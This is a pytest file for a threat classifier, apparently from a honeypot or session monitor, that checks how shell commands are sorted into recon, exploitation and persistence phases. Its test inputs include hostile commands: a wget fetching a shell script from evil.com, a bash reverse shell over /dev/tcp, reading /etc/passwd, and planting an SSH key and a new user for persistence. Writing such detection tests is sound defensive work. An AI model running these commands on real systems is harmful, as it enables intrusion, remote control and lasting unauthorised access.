"""Unit tests for ThreatClassifier."""
import pytest
from app.session.models import AttackPhase


def test_ls_is_recon(classifier):
    phase = classifier.classify("ls -la /etc", AttackPhase.RECON)
    assert phase == AttackPhase.RECON


def test_cat_passwd_is_recon(classifier):
    phase = classifier.classify("cat /etc/passwd", AttackPhase.RECON)
    assert phase == AttackPhase.RECON


def test_wget_is_exploitation(classifier):
    phase = classifier.classify("wget http://evil.com/shell.sh", AttackPhase.RECON)
    assert phase == AttackPhase.EXPLOITATION


def test_reverse_shell_is_exploitation(classifier):
    phase = classifier.classify("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", AttackPhase.RECON)
    assert phase == AttackPhase.EXPLOITATION


def test_crontab_is_persistence(classifier):
    phase = classifier.classify("crontab -e", AttackPhase.EXPLOITATION)
    assert phase == AttackPhase.PERSISTENCE


def test_adduser_is_persistence(classifier):
    phase = classifier.classify("adduser hacker", AttackPhase.RECON)
    assert phase == AttackPhase.PERSISTENCE


def test_phase_never_downgrades(classifier):
    # Command is recon-level, but current phase is EXPLOITATION
    phase = classifier.classify("ls", AttackPhase.EXPLOITATION)
    assert phase == AttackPhase.EXPLOITATION


def test_authorized_keys_is_persistence(classifier):
    phase = classifier.classify("echo 'ssh-rsa AAA...' >> ~/.ssh/authorized_keys", AttackPhase.RECON)
    assert phase == AttackPhase.PERSISTENCE


def test_chmod_x_is_exploitation(classifier):
    phase = classifier.classify("chmod +x exploit.sh", AttackPhase.RECON)
    assert phase == AttackPhase.EXPLOITATION
